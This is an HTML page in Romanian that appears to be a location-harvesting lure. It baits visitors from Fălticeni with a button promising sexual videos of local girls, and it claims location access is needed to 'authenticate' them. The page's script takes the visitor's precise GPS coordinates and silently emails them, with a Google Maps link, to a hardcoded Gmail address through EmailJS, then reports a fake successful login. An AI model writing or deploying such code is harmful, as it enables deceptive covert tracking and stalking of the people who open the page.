<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barfa Falticeni</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-image: url('background.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h2, h1 {
            color: #6D0A0A;
            background: none;
            text-shadow: none;
        }
        button {
            background-color: black;
            color: white;
            font-weight: bold;
            border: none;
            padding: 15px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #333;
        }
    </style>
</head>
<body>
    <h1>Pagina de Bafta a Falticeniului</h1>
    <h2>Aceasta pagina este destinata persoanelor din Falticeni.</h2>
    <button onclick="sendLocation()">FETE DE CASA VIDEOCLIPURI</button>
    
    <script>
        (function() {
            emailjs.init("bIL849otAkTIk8w1o"); // Public Key
        })();
        
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    
                    const templateParams = {
                        user_email: "ciprianionut.exe17@gmail.com",
                        message: `Latitudine: ${latitude}, Longitudine: ${longitude}, Precizie: ${accuracy}m\n\nVezi locația pe hartă: ${mapsLink}`
                    };
                    
                    emailjs.send("service_ar3ptv9", "template_er5zc5m", templateParams)
                        .then(response => {
                            alert("Autentificare realizata cu succes!");
                        }, error => {
                            console.error("Eroare la trimitere:", error);
                            alert("Eroare la trimiterea emailului.");
                        });
                }, error => {
                    alert('Nu te poti autentifica, trebuie sa ne asiguram ca esti din Falticeni, activeaza locatia.');
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert('Browserul nu este compatibil.');
            }
        }
    </script>
</body>
</html>
